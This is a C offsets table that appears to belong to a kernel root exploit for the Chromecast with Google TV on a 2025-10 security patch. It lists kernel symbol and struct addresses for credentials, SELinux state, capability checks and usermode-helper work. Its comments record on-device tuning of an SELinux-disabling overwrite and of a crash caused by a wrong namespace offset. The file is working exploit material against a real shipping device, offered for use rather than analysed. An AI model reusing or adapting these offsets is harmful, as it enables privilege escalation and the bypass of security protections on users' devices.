/* Chromecast with Google TV (sabrina) - Amlogic S905X3
 * Kernel: 5.15.170-android14-11-gf4a1f03072af
 * Security patch: 2025-10-01, Build: UTTC.250917.004
 * 
 * aarch64 kernel with 32-bit compat userspace (armeabi-v7a).
 * KASLR active (Kernel Offset observed: 0x1600080000).
 * Symbols from vmlinux built at GKI tag android14-5.15.170_r00.
 * Struct offsets from pahole on the same build.
 */

OFFSETS_ENTRY("5.15.170-android14-11-gf4a1f03072af",
  /* Amlogic S905X3: PHYS_OFFSET=0x0 (from pstore).
   * kernel_phys_load = 0x1080000 (from pstore .text line). */
  .kernel_phys_load = 0x1080000,
  .phys_offset = 0x0,
  .kimage_text_base = 0xffffffc008000000ULL,

  .off_init_task          = 0x0120BAC0ULL,
  .off_init_cred          = 0x0121C558ULL,
  .off_init_user_ns       = 0x0121B080ULL,  /* REFERENCE vmlinux (clang-22/LTO_NONE) - NOT device-valid; storm/diagnostic only */
  .off_selinux_enforcing_device = 0x01C08F30ULL, /* device .bss pair-verified (selinux_state = selinux_avc + 0x1828) */
  .off_init_user_ns_device = 0x019EB898ULL, /* OBSERVED on-device &init_user_ns = anchor+0x19EB898. Previous 0x19EB080 (boot-log .data start + reference in-.data offset) is 0x818 too low; that wrong ns is not an ancestor of targ_ns and its ->level is negative, so cap_capable() walks ns->parent off the top (init_user_ns->parent==NULL) and NULL-derefs -> kernel panic. */
  /* DEVICE selinux_state, anchor-relative - DERIVED FROM THE OBSERVED
   * avc/state PAIR, verified on device across multiple boots/storms:
   *   reference: selinux_avc  .bss+0x3FEA0 (0x9377ea8)
   *              selinux_state .bss+0x416C8 (0x93796d0)
   *              delta = 0x1828 EXACTLY
   *   device:    leak candidates anchor+0x1C07708 and anchor+0x1C08F30
   *              delta = 0x1828 EXACTLY (identical pair geometry)
   *              both shifted +0x1060 from their reference .bss positions
   *   -> selinux_avc = anchor+0x1C07708, selinux_state = anchor+0x1C08F30.
   * The .bss prefix's internal layout is preserved by ThinLTO (whole
   * prefix shifted +0x1060). The naive boot-log derivation (0x1C07ED0)
   * missed the +0x1060 shift and landed inside selinux_avc (an empty
   * avc_cache bucket - survived, but enforce stayed 1). */
  .off_selinux_enforcing_device = 0x01C08F30ULL,
  .off_init_uts_ns        = 0x0120A7E8ULL,
  .off_empty_zero_page    = 0x01339000ULL,
  .off_root_task_group    = 0x0133FF40ULL,
  .off_selinux_enforcing  = 0x013796D0ULL,
  .off_kptr_restrict      = 0x011FBB68ULL,
  .off_selinux_blob_sizes = 0x00FB9680ULL,
  .off_security_hook_heads= 0x00FB71E8ULL,
  .off_kmalloc_caches     = 0x00FB6CC8ULL,
  .off_anon_pipe_buf_ops  = 0x00E59160ULL,
  .off_ashmem_misc_fops   = 0x012EFFF0ULL,
  .off_ashmem_fops        = 0x00F8A488ULL,
  .off_ashmem_ioctl       = 0x009387C8ULL,
  .off_ashmem_compat_ioctl= 0x00938EF8ULL,
  .off_ashmem_mmap        = 0x00938F48ULL,
  .off_ashmem_open        = 0x009390F8ULL,
  .off_ashmem_release     = 0x0093917CULL,
  .off_ashmem_show_fdinfo = 0x0093929CULL,
  .off_configfs_read_iter = 0x0039FC7CULL,
  .off_configfs_bin_write_iter = 0x0039FE40ULL,
  .off_copy_splice_read   = 0,  /* not present in 5.15 */
  .off_noop_llseek        = 0x002E3A00ULL,
  .off_cap_capable_active = 0x0049A5D8ULL,
  .off_slide_nfulnl_logger= 0x011FFB08ULL,
  .off_slide_loggers_0_1  = 0x011FFA38ULL,
  .off_slide_boot_id      = 0x01391849ULL,

  .off_system_unbound_wq  = 0x011FAE48ULL,
  .off_call_usermodehelper_exec_work = 0x0008FDB4ULL,

  /* task_struct field offsets (aarch64 5.15.170 pahole) */
  .task_prio = 0x7C,
  .task_normal_prio = 0x84,
  .task_sched_task_group = 0x340,
  .task_pi_lock = 0x8E4,
  .task_pi_waiters = 0x8F8,
  .task_pi_top_task = 0x908,
  .task_pi_blocked_on = 0x910,
  .task_pid = 0x638,
  .task_tgid = 0x63C,
  .task_real_parent = 0x648,
  .task_atomic_flags = 0x5F8,
  .task_real_cred = 0x7F0,
  .task_cred = 0x7F8,
  .task_comm = 0x808,
  .task_tasks = 0x530,
  .task_seccomp = 0x8C0,
  .mm_owner = 0x348,
  /* 5.15 rt_mutex_waiter: prio/deadline are separate fields, not in rb_node.
   Compact layout: task at waiter word 6, lock at 7. */
  .waiter_compact = 1,

  .fops_llseek = 0x10,
  .fops_read = 0x18,
  .fops_write = 0x20,
  .fops_read_iter = 0x28,
  .fops_write_iter = 0x30,
  .fops_open = 0x78,
  .fops_release = 0x88,
  .fops_splice_read = 0xD0,
  .fops_show_fdinfo = 0xE8,
),
